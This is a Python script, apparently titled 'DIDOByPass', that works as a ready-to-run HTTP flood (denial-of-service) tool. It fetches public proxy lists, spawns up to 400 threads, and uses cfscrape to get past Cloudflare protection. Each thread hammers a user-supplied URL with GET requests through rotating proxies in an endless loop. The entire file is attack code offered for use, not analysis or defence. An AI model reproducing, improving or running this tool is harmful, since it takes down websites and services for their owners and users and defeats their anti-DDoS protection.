import cfscrape
import os
import random
import time
import requests
import threading
from colorama import Fore

os.system('title                                   ########## DIDOByPass ##########')
os.system('color a')
color = ['a', 'b', 'c', 'd', 'e', 'f']
os.system('color %s' % (color[random.randrange(0, 5, 1)]))
print ('''
________________________________________________________________________
            ____       _____         ________  ___        __ __          
           / __ \____ / ___/   ____ /_  __/ /_/   | _____/ //_/         
          / / / / __ \\__ \   / __` // / / __/ /| |/ ___/ , <            
         / /_/ / /_/ /__/ /  / /_/ // / / /_/ ___ / /__/ /| |           
        /_____/\____/____/   \__,_//_/  \__/_/  |_\___/_/ |_|            
                                                                        
________________________________________________________________________                                                                        
                            ,                                                
                           /|                                               
                          / |                                                  
                         /  |   /~.~.~.~.~.~.~.~.~                             
      .~.~.~.~.~.~.~.~.~*   |  /                                             
                            | /                                              
                            |,                                           
                                                                          
________________________________________________________________________
''')

print("Script by dido:")
print("Version 0.6:")

def opth():
	for a in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads " + str(a+1) + " Created ")
	print("Wait A Few Seconds For Threads Ready To Attack ...")
	time.sleep(10)
	input("Press Enter To Launch Attack !")
	global oo
	oo = True

oo = False
def main():
	global url
	global list
	global pprr
	global thr
	global per
	url = str(input("URL/Ip: "))
	ssl = str(input("Enable SSL Mode ? (y/n): "))
	ge  = str(input("Get New SSL https Proxies List ? (y/n): "))
	if ge =='y':
		if ssl == 'y':
			rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=700&country=all&ssl=yes&anonymity=all') #Code By Hackdido037
			with open('SSL https.txt','wb') as fp:
				fp.write(rsp.content)
				print("Sucess Get SSL https Proxies List !")
		
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=1000') #Code By Hackdido037
			with open('SSL https.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Sucess Get SSL https Proxies List !")
	else:
		pass
	list = str(input("List (SSL https.txt) : "))
	pprr = open(list).readlines()
	print("Proxies Count : " "%d" %len(pprr))
	thr = int(input("Threads (1-400 Default Is 300) : "))
	per = int(input("CC.Power (1-100 Default Is 70) : "))
	opth()

def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = cfscrape.create_scraper()
	s.proxies = {}
	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
	time.sleep(5)
	while True:
		while oo:
			try:
				s.get(url)
				print("DIDOBypass -> " + str(url)+ " Attack~# " + str(proxy[0])+":"+str(proxy[1]))
				try:
					for g in range(per):
						s.get(url)
						print("DIDOBypass -> " + str(url)+ " Attack~# " + str(proxy[0])+":"+str(proxy[1])) #code By Hackdido037
					s.close()
				except:
					s.close()
			except:
				s.close()
				print("Can't Connect To SSL https Proxies Or Url !")


if __name__ == "__main__":
	main()
